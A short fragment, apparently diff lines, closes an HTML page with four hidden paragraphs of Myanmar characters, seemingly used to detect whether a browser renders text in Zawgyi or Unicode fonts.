+
+<p style="position: absolute; visibility: hidden;" id="testStr">&#4174;</p><p style="position: absolute; visibility: hidden;" id="standardStr">&#4100;</p><p style="position: absolute; visibility: hidden;" class="zgFont" id="zgStr">&#4174;</p><p style="position: absolute; visibility: hidden;" class="uniFont" id="uniStr">&#4174;</p></body></html>
